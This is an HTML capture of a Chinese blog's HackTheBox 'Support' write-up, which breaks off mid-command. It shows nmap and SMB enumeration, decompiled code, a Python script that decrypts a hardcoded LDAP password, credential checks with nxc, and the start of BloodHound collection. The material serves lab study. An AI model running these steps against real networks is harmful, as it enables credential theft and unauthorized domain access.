<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_buildManifest.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine -Support","contentHtml":"\u003ch1\u003eMachine -Support\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Support\"\u003ehttps://app.hackthebox.com/machines/Support\u003c/a\u003e | \u003ccode\u003eWindows\u003c/code\u003e | \u003ccode\u003e~~Easy~~\u003c/code\u003e \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-Support/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003e端口信息\u003c/h3\u003e\n\u003cp\u003e使用 \u003ccode\u003enmap\u003c/code\u003e 进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support nmap -sT -min-rate 5000 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e support.htb (10.10.11.174)\nHost is up (0.13s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1.00 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e support.htb (10.10.11.174)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE       VERSION\n53/tcp  open     domain        Simple DNS Plus\n88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-06-04 12:45:55Z)\n135/tcp open     msrpc         Microsoft Windows RPC\n138/tcp filtered netbios-dgm\n389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp open     microsoft-ds?\n636/tcp open     tcpwrapped\n593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (88%)\nOS CPE: cpe:/o:microsoft:windows_server_2022\nAggressive OS guesses: Microsoft Windows Server 2022 (88%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-06-04T12:46:16\n|_  start_date: N/A\n|_clock-skew: -21m30s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   122.30 ms 10.10.16.1\n2   237.33 ms support.htb (10.10.11.174)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 68.41 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eSMB 枚举\u003c/h3\u003e\n\u003cp\u003e测试\u003ccode\u003eSMB\u003c/code\u003e是否允许匿名登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support smbclient -L 10.10.11.174 -U anonymous                                      \nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e允许匿名登录，并且在\u003ccode\u003esupport-tools\u003c/code\u003e中有一些工具，全部 \u003ccode\u003eget\u003c/code\u003e 下来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support smbclient //10.10.11.174/support-tools -U anonymous -N\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a list of possible commands.\nsmb: \\\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n  .                                   D        0  Thu Jul 21 01:01:06 2022\n  ..                                  D        0  Sat May 28 19:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 19:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022\n  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022\n\n                4026367 blocks of size 4096. 955928 blocks available\nsmb: \\\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003e7-ZipPortable_21.07.paf.exe\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e 7-Zip Portable\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个便携版本的 7-Zip 文件归档器。7-Zip 是一款免费开源的压缩/解压缩软件，支持多种格式，如 7z, ZIP, GZIP, TAR, RAR 等。\u003ccode\u003e.paf.exe\u003c/code\u003e 通常是 PortableApps.com 格式的便携应用。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003enpp.8.4.1.portable.x64.zip\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e Notepad++ Portable (64位)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个包含 Notepad++ 便携版的 ZIP 压缩文件。Notepad++ 是一款非常流行的免费源代码编辑器和 Windows 记事本替代品，支持多种编程语言，功能强大。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eputty.exe\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e PuTTY\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个独立的 PuTTY 可执行文件。PuTTY 是一款广受欢迎的免费开源终端模拟器、串行控制台和网络文件传输应用程序。它最常用于通过 SSH、Telnet 或 rlogin 协议连接到远程服务器。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSysinternalsSuite.zip\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e Sysinternals Suite\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个包含微软 Sysinternals Suite 的 ZIP 压缩文件。Sysinternals Suite 是一套由 Mark Russinovich 开发的强大的 Windows 系统管理、故障排除和诊断工具集合（现在属于微软）。著名的工具包括 Process Explorer, Process Monitor, Autoruns, PsExec 等。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eUserInfo.exe.zip\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e 未知 (可能为自定义或特定用途工具)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个名为 \u003ccode\u003eUserInfo.exe\u003c/code\u003e 的可执行文件的 ZIP 压缩包。从名称上看，它可能是一个用于收集或显示用户信息的工具。这可能是系统管理员常用的自定义脚本或小程序，或者是特定场景下需要的工具。在渗透测试中，这类自定义工具往往值得进一步分析。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewindirstat1_1_2_setup.exe\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e WinDirStat 安装程序\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是 WinDirStat 版本 1.1.2 的安装程序。WinDirStat 是一款磁盘使用情况统计查看器和清理工具，它可以图形化地显示磁盘空间占用情况，帮助用户找到占用空间大的文件和文件夹。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eWiresharkPortable64_3.6.5.paf.exe\u003c/code\u003e:\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e工具:\u003c/strong\u003e Wireshark Portable (64位)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e用途:\u003c/strong\u003e 这是一个便携版本的 Wireshark。Wireshark 是世界上应用最广泛的网络协议分析器，用于捕获和交互式浏览计算机网络上运行的流量。\u003ccode\u003e.paf.exe\u003c/code\u003e 格式表明它也是 PortableApps.com 的便携应用。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e上面的所有应用中只有\u003ccode\u003eUserInfo.exe\u003c/code\u003e 不是公开的软件，我们可以着重对该软件进行分析\u003c/p\u003e\n\u003ch2\u003e分析 UserInfo.exe\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003ednSpy\u003c/code\u003e 来分析，该程序貌似是通过 \u003ccode\u003eLDAP\u003c/code\u003e 来检索用户信息，并且内置了用户（大致看懂）\u003c/p\u003e\n\u003cp\u003e下面的类 \u003ccode\u003eProtected\u003c/code\u003e 是加密密码的（这里开始使用\u003ccode\u003eAI\u003c/code\u003e来分析）\u003c/p\u003e\n\u003cp\u003e这一段代码其实是使用异或加密密码，并且秘钥是\u003ccode\u003earmando\u003c/code\u003e ，因此我们能够直接得到密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eusing System;\nusing System.Text;\n\nnamespace UserInfo.Services\n{\n\t// Token: 0x02000006 RID: 6\n\tinternal class Protected\n\t{\n\t\t// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318\n\t\tpublic static string \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003egetPassword\u003c/span\u003e\u003c/span\u003e()\n\t\t{\n\t\t\tbyte[] array = Convert.FromBase64String(Protected.enc_password);\n\t\t\tbyte[] array2 = array;\n\t\t\t\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (int i = 0; i \u0026#x3C; array.Length; i++)\n\t\t\t{\n\t\t\t\tarray2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);\n\t\t\t}\n\t\t\t\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e Encoding.Default.GetString(array2);\n\t\t}\n\n\t\t// Token: 0x04000005 RID: 5\n\t\tprivate static string enc_password = \u003cspan class=\"hljs-string\"\u003e\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\u003c/span\u003e;\n\n\t\t// Token: 0x04000006 RID: 6\n\t\tprivate static byte[] key = Encoding.ASCII.GetBytes(\u003cspan class=\"hljs-string\"\u003e\"armando\"\u003c/span\u003e);\n\t}\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003eAI\u003c/code\u003e 生成解密脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 从 C# 代码中获取的值\u003c/span\u003e\nenc_password_b64 = \u003cspan class=\"hljs-string\"\u003e\"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\u003c/span\u003e\nkey_string = \u003cspan class=\"hljs-string\"\u003e\"armando\"\u003c/span\u003e\nxor_constant = 223\n\n\u003cspan class=\"hljs-comment\"\u003e# 1. Base64 解码\u003c/span\u003e\ntry:\n    encrypted_bytes = base64.b64decode(enc_password_b64)\nexcept base64.binascii.Error as e:\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Base64 解码错误: {e}\"\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e()\n\n\u003cspan class=\"hljs-comment\"\u003e# 2. 获取密钥的字节形式 (ASCII)\u003c/span\u003e\nkey_bytes = key_string.encode(\u003cspan class=\"hljs-string\"\u003e'ascii'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# 准备一个可变的字节数组来存放解密后的字节\u003c/span\u003e\ndecrypted_bytes = bytearray()\n\n\u003cspan class=\"hljs-comment\"\u003e# 3. 执行 XOR 解密\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(len(encrypted_bytes)):\n    \u003cspan class=\"hljs-comment\"\u003e# C# 中的逻辑是: (byte ^ key_byte ^ 223)\u003c/span\u003e\n    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant\n    decrypted_bytes.append(dec_byte)\n\n\u003cspan class=\"hljs-comment\"\u003e# 4. 将解密后的字节数组转换为字符串\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# C# 中的 Encoding.Default 行为可能依赖于系统区域设置。\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 我们首先尝试 'utf-8'，如果密码包含非 ASCII 字符且编码不同，可能需要调整。\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# 对于这个特定的密码 \"Cisco.12345\"，'utf-8' 或 'ascii' 都可以。\u003c/span\u003e\ntry:\n    final_password = decrypted_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\nexcept UnicodeDecodeError:\n    \u003cspan class=\"hljs-comment\"\u003e# 如果 utf-8 失败，可以尝试其他编码，如 latin-1 (常用于模拟某些 Windows 默认编码)\u003c/span\u003e\n    try:\n        final_password = decrypted_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'latin-1'\u003c/span\u003e)\n    except UnicodeDecodeError as e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"字符串解码错误: {e}\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"解密后的字节（原始）: {decrypted_bytes}\"\u003c/span\u003e)\n        final_password = \u003cspan class=\"hljs-string\"\u003e\"解码失败，请检查编码\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 打印结果\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"Base64 编码的密文: {enc_password_b64}\"\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"密钥字符串: {key_string}\"\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"固定的 XOR 值: {xor_constant}\"\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"解密后的字节 (十六进制): {decrypted_bytes.hex()}\"\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"解密后的密码: {final_password}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support python getpass.py       \nBase64 编码的密文: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\n密钥字符串: armando\n固定的 XOR 值: 223\n解密后的字节 (十六进制): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a\n解密后的密码: nvEfEK16^1aM4$e7AclUf8x\u003cspan class=\"hljs-variable\"\u003e$tRWxPWO1\u003c/span\u003e%lmz\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e而 \u003ccode\u003eLdapQuery\u003c/code\u003e 类的构造函数中能看到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epublic \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eLdapQuery\u003c/span\u003e\u003c/span\u003e()\n\t\t{\n\t\t\tstring password = Protected.getPassword();\n\t\t\tthis.entry = new DirectoryEntry(\u003cspan class=\"hljs-string\"\u003e\"LDAP://support.htb\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"support\\\\ldap\"\u003c/span\u003e, password);\n\t\t\tthis.entry.AuthenticationType = AuthenticationTypes.Secure;\n\t\t\tthis.ds = new DirectorySearcher(this.entry);\n\t\t}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e创建 \u003ccode\u003eDirectoryEntry\u003c/code\u003e 对象时，第二个参数通常用于指定用户名。因此，这里的用户名是：\u003ccode\u003esupport\\ldap\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这个格式 \u003ccode\u003eDOMAIN\\username\u003c/code\u003e 表明 \u003ccode\u003esupport\u003c/code\u003e 可能是域名或者工作组名，而 \u003ccode\u003eldap\u003c/code\u003e 是具体的用户名。\u003c/p\u003e\n\u003cp\u003e我们直接测试凭据是否是正确的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support nxc ldap 10.10.11.174 -u ldap -p \u003cspan class=\"hljs-string\"\u003e'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'\u003c/span\u003e -d support.htb\nLDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nLDAP        10.10.11.174    389    DC               [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x\u003cspan class=\"hljs-variable\"\u003e$tRWxPWO1\u003c/span\u003e%lmz \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e凭据是正确的\u003c/p\u003e\n\u003ch2\u003e域分析\u003c/h2\u003e\n\u003ch3\u003e域初次分析\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eBloodHound\u003c/code\u003e 分析域\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Support bloodhound-python -u ldap -p \u003cspan class=\"hljs-string\"\u003e'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'support.htb'\u003c/span\u003e -ns 10.10.11.174 --zip -c All -dc \u003cspan 